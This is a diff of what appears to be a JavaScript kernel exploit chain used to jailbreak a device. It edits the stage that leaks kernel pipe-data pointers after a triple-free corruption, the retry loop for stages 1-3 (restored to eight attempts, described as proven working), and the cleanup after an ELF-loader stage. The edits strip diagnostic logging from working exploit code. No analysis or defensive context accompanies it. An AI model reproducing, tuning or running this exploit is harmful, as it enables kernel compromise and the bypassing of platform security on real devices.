@@ -55,7 +55,7 @@
         const UIO_SYSSPACE = 1n;
 
         const TRIPLEFREE_ATTEMPTS = 96;
-        const STAGES123_ATTEMPTS = 1;
+        // stages 1-3 retry count (was hardcoded 8 in proven working 43f14ea)
         const MAX_ROUNDS_TWIN = 10;
         const MAX_ROUNDS_TRIPLET = 500;
         const FIND_TRIPLET_FAST = 5000;
@@ -1532,62 +1532,38 @@
         }
 
         async function stage2(S) {
-            breadcrumb("stage2:start proc_filedesc=" + toHex(S.proc_filedesc) +
-                " triplets=" + S.triplets.join(","));
             send_notification("Stage 2\nLeak pipe data pointers");
             await ulog("stage2: leaking pipe pointers...");
-            let stage2_last_reason = "not started";
-            const read_stage2_ptr = (name, kaddr) => {
-                const val = kslow64(S, kaddr);
-                if (is_kernel_ptr(val)) return val;
-                if (val) {
-                    stage2_last_reason = name + " rejected non-kptr " +
-                        toHex(val) + " (" + S.kslow_last_reason + ")";
-                    return null;
-                }
-                stage2_last_reason = name + " read failed (" +
-                    S.kslow_last_reason + ")";
-                return null;
-            };
             for (let attempt = 0; attempt < 5; attempt++) {
                 repair_triplets(S); nanosleep_ms(100);
-                const fdescenttbl = read_stage2_ptr("fd table",
-                    S.proc_filedesc + S.OFF.FILEDESC_OFILES);
+                const fdescenttbl = kslow64(S, S.proc_filedesc + S.OFF.FILEDESC_OFILES);
                 if (!fdescenttbl) continue;
                 S.fd_ofiles = fdescenttbl + S.OFF.FDESCENTTBL_HDR;
                 repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
-                const master_fp = read_stage2_ptr("master file pointer",
-                    S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
+                const master_fp = kslow64(S, S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
                 if (!master_fp) continue;
                 repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
-                const victim_fp = read_stage2_ptr("victim file pointer",
-                    S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
+                const victim_fp = kslow64(S, S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
                 if (!victim_fp) continue;
                 repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
-                S.master_pipe_data = read_stage2_ptr("master pipe data",
-                    master_fp);
+                S.master_pipe_data = kslow64(S, master_fp);
                 if (!S.master_pipe_data) continue;
                 repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
-                S.victim_pipe_data = read_stage2_ptr("victim pipe data",
-                    victim_fp);
+                S.victim_pipe_data = kslow64(S, victim_fp);
                 if (!S.victim_pipe_data) continue;
 
                 if (S.master_pipe_data !== S.victim_pipe_data) {
-                    breadcrumb("stage2:done master_pipe=" +
-                        toHex(S.master_pipe_data) + " victim_pipe=" +
-                        toHex(S.victim_pipe_data));
                     await ulog("stage2: master_pipe=" + toHex(S.master_pipe_data) +
                         " victim_pipe=" + toHex(S.victim_pipe_data));
                     return;
                 }
-                stage2_last_reason = "pipe data pointers matched";
                 nanosleep_ms(500); repair_triplets(S);
             }
-            fail("stage2: failed to leak pipe pointers (" + stage2_last_reason + ")");
+            fail("stage2: failed to leak pipe pointers");
         }
 
         async function stage3(S) {
@@ -2237,16 +2213,8 @@
                 send_notification("Stage 7\nelfldr failed: " + e.message +
                     "\n(jailbreak still complete)");
             } finally {
-                breadcrumb("stage_elfldr:cleanup:start");
-                if (chainload_started) {
-                    breadcrumb("stage_elfldr:cleanup:skipped_chainload_started");
-                    await ulog("stage_elfldr: cleanup skipped; chainload owns " +
-                        "the handoff pipes");
-                } else {
-                    await cleanup_kexp_pipes(S);
-                    await cleanup_ipv6_kernel_rw(S);
-                    breadcrumb("stage_elfldr:cleanup:done");
-                }
+                await cleanup_kexp_pipes(S);
+                await cleanup_ipv6_kernel_rw(S);
             }
         }
 
@@ -2429,27 +2397,20 @@
             await stage0(S);
 
             let s123_ok = false;
-            for (let r = 1; r <= STAGES123_ATTEMPTS && !s123_ok; r++) {
+            for (let r = 1; r <= 8 && !s123_ok; r++) {
                 try {
-                    breadcrumb("stages1_3:attempt=" + r);
                     await stage1(S);
                     await stage2(S);
                     await stage3(S);
                     s123_ok = true;
-                    breadcrumb("stages1_3:done attempt=" + r);
                 } catch (e) {
-                    breadcrumb("stages1_3:failed attempt=" + r + " " + e.message);
-                    if (r < STAGES123_ATTEMPTS) {
-                        await ulog("stages 1-3 attempt " + r + "/" +
-                            STAGES123_ATTEMPTS + " failed: " +
-                            e.message);
+                    if (r < 8) {
                         try { repair_triplets(S); } catch (_) { }
                         nanosleep_ms(500);
                     }
                 }
             }
-            if (!s123_ok) fail("stages 1-3 failed after " +
-                STAGES123_ATTEMPTS + " attempt(s)");
+            if (!s123_ok) fail("stages 1-3 failed after 8 attempts");
 
             await stage4(S);
             await stage5(S);
